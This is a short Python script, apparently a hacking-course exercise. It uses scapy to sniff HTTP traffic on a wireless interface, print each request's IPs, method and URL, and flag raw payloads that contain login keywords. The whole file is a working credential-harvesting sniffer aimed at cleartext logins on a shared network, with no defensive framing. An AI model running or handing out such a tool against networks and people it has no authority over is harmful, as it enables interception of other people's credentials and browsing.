#!/usr/bin/evn python

import scapy.all as scapy
from scapy.layers import http

#Dictionary with console color codes to print text
colors = {'HEADER' : "\033[95m",
    'OKBLUE' : "\033[94m",
    'RED' : "\033[91m",
    'OKYELLOW' : "\033[93m",
    'GREEN' : "\033[92m",
    'LIGHTBLUE' : "\033[96m",
    'WARNING' : "\033[93m",
    'FAIL' : "\033[91m",
    'ENDC' : "\033[0m",
    'BOLD' : "\033[1m",
    'UNDERLINE' : "\033[4m" }
 
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)    

def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        method = packet[http.HTTPRequest].Method
        coockie = packet[http.HTTPRequest].Cookie
        ips = f"{packet[scapy.IP].src} ----> {packet[scapy.IP].dst}"    
        
        print(f"\x1b[6;30;42m {ips} :: {method} \x1b[0m :--: \033[93m {url} ")

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ['username','User','UserName','Login', 'login','user']
            for key in keywords:                
                if key in str(load):
                    print(f"\n\n \x1b[3;37;41m \033[1m[+] {ips} :==: {method} {url}  {load} \x1b[0m \n\n")
                    break
        


interface = "wlan0"

sniff(interface)




